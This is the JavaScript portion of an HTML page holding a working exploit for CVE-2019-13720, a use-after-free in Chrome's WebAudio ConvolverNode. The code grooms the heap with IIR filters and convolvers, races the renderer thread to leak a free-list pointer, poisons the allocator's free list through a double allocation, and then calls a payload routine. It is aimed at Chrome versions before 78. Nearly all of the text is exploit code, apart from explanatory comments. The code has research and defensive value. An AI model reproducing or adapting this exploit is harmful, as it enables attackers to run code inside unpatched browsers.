    for (var j = 0; j < MutableFreeListAudioBufs.length; j++) {
        let MutableFreeListEntry = new BigUint64Array(MutableFreeListAudioBufs[j].getChannelData(0).buffer);
        if (MutableFreeListEntry[0] != BigInt(0)) {
            let FreeListHeadPtr = GetPartitionPageMetadata(ReverseBigInt(MutableFreeListEntry[0])); // Extract the Super Page base/metadata entry for the leaked flink from feedforward: this will be in an ArrayMalloc Extent as opposed to the FastMalloc Extent.
            let AllocCount = 0;
            MutableFreeListEntry[0] = ReverseBigInt(FreeListHeadPtr);
            
            // Spray new 8 byte allocations until our (controlled) poisoned free list flink entry is allocated
            
            do {
                GcPreventer.push(new ArrayBuffer(8));
                
                if (++AllocCount > 0x100000) {
                    DebugLog("... failed to re-claim final free list flink with alloc spray");
                    return; // If we sprayed this number of allocations without our poisoned flink being consumed, assume the re-claim failed
                }
            } while (MutableFreeListEntry[0] != BigInt(0));
            
            // The last allocation consumed our mutable free list flink entry (which we had poisoned the flink of to point at the free list head metadata on the Super Page head).
            
            let FreeListHead = new BigUint64Array(new ArrayBuffer(8)); // Alloc the free list head itself. We can now control where new allocs are made without needing to do sprays.
            GcPreventer.push(FreeListHead);
            ExecutePayload(FreeListHead);
            return;
        }
    }

    return;
}

async function DoubleAllocUAF(FeedforwardAddress, CallbackFunc) {
    let NumberOfChannels = 1;
    let TempAudioCtx = new OfflineAudioContext(NumberOfChannels, 48000 * 100, 48000);
    let AudioBufferSourceNode = TempAudioCtx.createBufferSource();
    let ConvolverNode = TempAudioCtx.createConvolver();
    let Finished = false;

    // Create and initialize two shared audio buffers: one for the buffer source, the other for the convolver (UAF)

    let BigSourceBuf = TempAudioCtx.createBuffer(NumberOfChannels, 0x100, 48000);
    let SmallUafBuf = TempAudioCtx.createBuffer(NumberOfChannels, 0x2, 48000);
 
    SmallUafBuf.getChannelData(0).fill(0);
 
    for (var i = 0; i < NumberOfChannels; i++) {
        var ChannelData = new BigUint64Array(BigSourceBuf.getChannelData(i).buffer);
        ChannelData[0] = FeedforwardAddress;
    }
 
    AudioBufferSourceNode.buffer = BigSourceBuf;
    ConvolverNode.buffer = SmallUafBuf;
 
    // Setup the audio processing graph and begin rendering

    AudioBufferSourceNode.loop = true;
    AudioBufferSourceNode.loopStart = 0;
    AudioBufferSourceNode.loopEnd = 1;
    AudioBufferSourceNode.connect(ConvolverNode);
    ConvolverNode.connect(TempAudioCtx.destination);
    AudioBufferSourceNode.start();
 
    TempAudioCtx.startRendering().then(function(Buf) {
        Buf = null;

        if (Finished) {
            TempAudioCtx = null;
            setTimeout(CallbackFunc, 200);
            return;
        } else {
            Finished = true;
            setTimeout(function() { DoubleAllocUAF(FeedforwardAddress, CallbackFunc); }, 1);
        }
    });
 
    while (!Finished) {
        ConvolverNode.buffer = null;
        await Sleep(1); // Give a small bit of time for the renderer to write the feedforward address into the freed buffer

        if (Finished) {
            break;
        }

        for (let i = 0; i < IIRFilters.length; i++) {
           OutputFloatArray.fill(0); // Initialize the array to all 0's the Nyquist filter created by getFrequencyResponse will see it populated by PI. 
           IIRFilters[i].getFrequencyResponse(OutputFloatArray, OutputFloatArray, OutputFloatArray);

            if (OutputFloatArray[0] != 3.1415927410125732) {
                Finished = true;
                DoubleAllocAudioBufs.push(TempAudioCtx.createBuffer(1, 1, 10000)); // These 2 allocs are accessing the fake flink in the feedforward array and re-claiming/"holding" it until the final UAF callback is called. We do not want Chrome to accidentally re-claim feedforward on its own. 
                DoubleAllocAudioBufs.push(TempAudioCtx.createBuffer(1, 1, 10000));
                AudioBufferSourceNode.disconnect();
                ConvolverNode.disconnect();
                return;
            }
        }

        ConvolverNode.buffer = SmallUafBuf;
        await Sleep(1);
    }
}

function InfoleakUAFCallback(LeakedFlinkPtr, RenderCount) {
    SharedAudioCtx = new OfflineAudioContext(1, 1, 3000); // This is a globally scoped context: its initialization location is highly sensitive to the heap layout later on (created after the infoleak UAF, but before the pre-payload heap grooming where it is used)
    HelperBigInt[0] = LeakedFlinkPtr;
    DebugLog("... leaked free list ptr from ScriptNode audio handler at iteration " + RenderCount.toString(10) + ": " + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    HelperBigInt[0] = GetSuperPageBase(LeakedFlinkPtr);
    DebugLog("... Super page: " + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    FeedforwardSuperPageBase = (HelperBigInt[0] - (BigInt(0x200000) * BigInt(42))); // Feedforward and the leaked ptr will share an extent, but feedforward will be in a bucket size 0x30 slot span on partition page index 27 of the first Super Page, while the location of the leaked ptr will be within a size 0x200 bucket size slot span on the second Super Page: after my heap grooming, this leaked ptr will consistently fall on Super Page 43 of 44 regardless of whether it falls in to a 0x200 or 0x240 slot span.
    HelperBigInt[0] = FeedforwardSuperPageBase;
    DebugLog("... first Super Page in extent: " + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    HelperBigInt[0] = GetSuperPageMetadata(FeedforwardSuperPageBase);
    FeedforwardSuperPageMetadata = HelperBigInt[0]; // This is needed for later in the exploit.
    IIRFilterFeedforwardAllocPtr = GetPartitionPageBase(FeedforwardSuperPageBase, BigInt(27)) + BigInt(0xFF0); // Offset 0xFF0 in to the 0x30 slot span on the first Super Page will translate to slot index 86, which will reliably contain the previously sprayed feedforward data.
    HelperBigInt[0] = IIRFilterFeedforwardAllocPtr;
    DebugLog("... IIRFilterFeedforwardAllocPtr: " + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    DoubleAllocUAF(ReverseBigInt(IIRFilterFeedforwardAllocPtr), PrePayloadHeapGroom);
}

async function InfoleakUAF(CallbackFunc) { 
    let TempAudioCtx = new OfflineAudioContext(1, 48000 * 100, 48000); // A sample frame is a Float32: here we dictate what the total/maximum number of frames will be. Wheen rendering begins a destination buffer of size (4 * NumberOfSampleFrame) will be allocated to hold the processsed data after it travels through the ConvolverNode and ScriptNode.
    let AudioBufferSourceNode = TempAudioCtx.createBufferSource();
    let ConvolverNode = TempAudioCtx.createConvolver(); 
    let ScriptNode = TempAudioCtx.createScriptProcessor(0x4000, 1, 1); // 0x4000 buffer size, 1 input channel 1 output channel.
    let ChannelBuf = TempAudioCtx.createBuffer(1, 1, 48000);
    let OriginBuf = TempAudioCtx.createBuffer(1, 1, 48000); 
    let Finished = false;
    let RenderCount = 0;

    ConvolverNode.buffer = ChannelBuf;
    AudioBufferSourceNode.buffer = OriginBuf; // The source of all data flowing through the audio processing graph: its contents will be repeatedly duplicated and sent through the graph until the OfflineAudioContext.destination is full

    AudioBufferSourceNode.loop = true;
    AudioBufferSourceNode.loopStart = 0;
    AudioBufferSourceNode.loopEnd = 1;

    ChannelBuf.getChannelData(0).fill(0); // This is the SharedAudioBuffer that will be shared between this thread and the renderer thread
    AudioBufferSourceNode.connect(ConvolverNode);
    ConvolverNode.connect(ScriptNode);
    ScriptNode.connect(TempAudioCtx.destination);

    AudioBufferSourceNode.start();
    
    ScriptNode.onaudioprocess = function(Evt) {
        RenderCount++;
        for (let i = 0; i < 1; i++) {
            let ChannelInputBuf = new Uint32Array(Evt.inputBuffer.getChannelData(i).buffer);

            for (let j = 0; j < ChannelInputBuf.length; j++) {
                /*
                Notably, it is not only the first frame of the input buffer which is checked for the leaked flink.
                There are 16384 frames (each the size of a Float32) copied into the input channel buffer each
                time this handler receives an event. Typically only 0-1 of these frames will contain a leaked 
                flink freelist pointer.
                */

                if (j + 1 < ChannelInputBuf.length && ChannelInputBuf[j] != 0 && ChannelInputBuf[j + 1] != 0) {
                    let TempHelperBigInt = new BigUint64Array(1);
                    let TempHelperDword = new Uint32Array(TempHelperBigInt.buffer);
                    
                    TempHelperDword[0] = ChannelInputBuf[j + 0]; // Extract a QWORD from the SharedAudioBuffer
                    TempHelperDword[1] = ChannelInputBuf[j + 1];
                    
                    let LeakedFlinkPtr = ReverseBigInt(TempHelperBigInt[0]);

                    // Check QWORD from SharedAudioBuffer for a non-zero value
                    
                    if (LeakedFlinkPtr >> BigInt(32) > BigInt(0x8000)) {
                        LeakedFlinkPtr -= BigInt(0x800000000000); // Valid usermode pointer, or within kernel region?
                    }

                    if (LeakedFlinkPtr < BigInt(0xFFFFFFFFFFFF) && LeakedFlinkPtr > BigInt(0xFFFFFFFF)) {
                        // Valid leak: end the recursion cycle for this UAF and execute a callback
                        
                        Finished = true;
                        Evt = null;
                        AudioBufferSourceNode.disconnect();
                        ScriptNode.disconnect();
                        ConvolverNode.disconnect();
                        setTimeout(function() { CallbackFunc(LeakedFlinkPtr, RenderCount); }, 1);
                        return;
                    }
                }
            }
        }
    };

    TempAudioCtx.startRendering().then(function(Buf) {
        Buf = null; // Rendering is finished: always consider this the end of this iteration of attempted UAF and recursively re-execute the UAF until the ScriptNode picks up a UAF and ends the recursion cycle

        if (!Finished) {
            Finished = true;
            InfoleakUAF(CallbackFunc);

        }
    });

    /*
    Attack the race condition which allows for a free list flink to be copied
    into the ScriptNode input channel buffer: the renderer thread is receiving
    data into the SharedBuffer in the Convolver, processing it, then copying
    it into the ScriptNode input channel until it is full (then the ScriptNode
    receives an event). The SharedBuffer must be freed precisely between the
    time when new data is received from the BufferSource, and the processed data
    is copied into the ScriptNode. Simply freeing the buffer will not work, 
    since the next chunk of data from the BufferSource will not be placed into
    SharedBuffer if it is NULL. However, there is no check if SharedBuffer is
    NULL when the processed data it contains is copied into the ScriptNode input.
    */
    
    while (!Finished) {
        ConvolverNode.buffer = null;
        ConvolverNode.buffer = ChannelBuf;
        await Sleep(1); // 1ms
    }
}

function FeedforwardHeapGroom() { 
    let TempAudioCtx = new OfflineAudioContext(1, 48000 * 100, 48000);
    let FeedforwardArray = new Float64Array(2); // 0x30 allocation. Size may be adjusted: 20 = 0xa0 size. 20 is max. Does not influence contained data.
    let FeedbackArray = new Float64Array(1); // Has no effect on allocation size but directly influences contained data.

    // Spray 0x30 allocations into the FastAlloc Extent (Super Page 1/2). The debug egg can be used to locate this Extent in memory.

    FeedbackArray[0] = DebugEgg; // Modifying this value controls the data at offset 0x18 of the 0x30 slot. Value from 0xeeeeeeee egg: 1f 1a eb 47 92 24 f1 bd 0xbdf1249247eb1a1f
    FeedforwardArray[0] = 0; // Changing these feedforward values has no affect on memory at leaked ptr
    FeedforwardArray[1] = -1;

    for (let i = 0; i < (256 * 1); i++) { // The 0x30 slot span will typically fall on Partition Page 27 of the first Super Page of the FastMalloc Extent when these IIR filtrs are creatd directly after page initialization.
        IIRFilters.push(TempAudioCtx.createIIRFilter(FeedforwardArray, FeedbackArray));
    }

    // Clog the free 0x240 slots in the first Super Page of the FastAlloc Extent: chrome_child!blink::BackgroundHTMLParser::Create+0x2f triggers an 0x230 during init which causess an 0x240 slot span to be created in the first Super Page. 

    let Bucket240Slots = 62; // 63 will cause one additional 0x240 alloc in the final Super Page (44), resulting in a potential issue with delta from leaked pointer. 61 and lower will consistently crash.

    for(var x = 0; x < Bucket240Slots; x++) { // Size 0x240 slot spans have 64 slots in them. This count ensures the 0x240 slot span in the first Super Page will be clogged. Only 1 alloc (of size 0x230) will be present in 0x240 slot span.
        TempConvolver = TempAudioCtx.createConvolver();
        AudioBuf = TempAudioCtx.createBuffer(1, 0x10, 48000);
        TempConvolver.buffer = AudioBuf;
        GcPreventer.push(AudioBuf);
        GcPreventer.push(TempConvolver);
    }

    // Allocs of 0x240 will fall into a slot span on Super Page 43. However, 0x200 will fall in to 42. Spray 32 0x200 allocs to create/clog a slot span on Super Page 42 to ensure this does not happen.

    let Bucket200Slots = 36; // An extra couple slot allocs in case there are open slots <= 42 which may sink hole the desired memory leak pointer from SetBuffer. Too many of these allocs may push the leaked pointer into 44 though, so this is a delicate balance.

    for(var x = 0; x < (Bucket200Slots / 2); x++) {
        TempConvolver = TempAudioCtx.createConvolver(); // Each convolver triggers 2 FastZeroedMalloc of size 0x200. So 16 are needed to clog a slot span of 32 slots (which is universally the default 0x200 size)
        GcPreventer.push(TempConvolver);
    }
}

try {
    var BrowserVersion = navigator.userAgent.split("Chrome/")[1].split(" Safari/")[0];
    MajorVersion = parseInt(BrowserVersion.substr(0, 2));
    
    if (MajorVersion <= 78) {
        ValidBrowser = true;

        if(MajorVersion != 76) {
            alert("This exploit has only been tested on Google Chrome 76.0.3809.132 Official Build 64-bit: for most reliable results use this version");
        }
    }
    else {
        alert("CVE-2019-13720 was patched in Google Chrome 78.0.3904.87: invalid browser");
    }
}
catch (e) {
    DebugLog("... failed to parse browser version from user agent.");
}

if(ValidBrowser) {
    FeedforwardHeapGroom();
    InfoleakUAF(InfoleakUAFCallback);
}
else {
    DebugLog("... unsupported browser version " + navigator.userAgent);
}
</script>
</html>